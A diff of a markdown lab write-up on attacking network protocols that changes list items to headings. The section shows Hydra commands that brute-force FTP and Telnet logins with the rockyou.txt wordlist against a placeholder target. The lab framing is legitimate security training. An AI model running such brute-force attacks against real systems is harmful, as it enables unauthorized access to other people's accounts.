@@ -45,13 +45,13 @@ The goal of this lab is to explore the vulnerabilities of common network protoco
 #### ✅ Objective:
 - Use Hydra perform brute force attacks against the following protocols:
 
-- FTP
+##### FTP
   ```
   hydra -L rockyou.txt -P rockyou.txt ftp://[target-ip]
   ```
   ![image](hydra-bruteforce-ftp.png)
   
-- TELNET
+##### TELNET
   ```
   hydra -L rockyou.txt -P rockyou.txt telnet://[target-ip]
   ```
